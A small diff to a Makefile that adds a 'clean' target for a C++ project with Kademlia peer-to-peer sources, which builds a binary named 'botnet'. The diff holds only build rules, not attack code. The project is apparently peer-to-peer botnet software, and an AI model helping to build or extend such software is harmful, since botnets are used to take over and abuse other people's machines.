@@ -4,3 +4,6 @@ FILES=src/main.cpp src/kad/contact.cpp src/kad/firewall.cpp src/kad/kad.cpp src/
 
 all:
 	$(CC) $(CFLAGS) $(FILES) -o botnet
+
+clean:
+	rm -fr botnet
